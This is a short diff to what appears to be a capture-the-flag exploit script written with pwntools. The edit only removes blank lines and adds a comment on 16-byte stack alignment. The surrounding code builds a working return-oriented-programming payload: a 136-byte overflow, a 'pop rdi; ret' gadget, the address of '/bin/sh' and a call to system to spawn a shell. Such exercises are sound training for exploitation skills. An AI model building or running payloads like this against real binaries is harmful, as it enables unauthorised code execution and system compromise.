@@ -55,8 +55,6 @@ def get_offset():
 def main():
     '''Return the flag.
     '''
-
-
     offset = 136
 
     rop = ROP(exe)
@@ -81,6 +79,7 @@ def main():
         print(f"System addr: {hex(system_addr)}")
         bin_sh_addr = base_addr + 0x2b40fa
         
+        # Note stack alignment issues so additional ret was required for 16 byte alignment
         payload = b"A" * offset + p64(rop.find_gadget(['pop rdi', 'ret'])[0]) + \
                     p64(bin_sh_addr) + p64(rop.find_gadget(['ret'])[0]) + \
                     p64(system_addr)
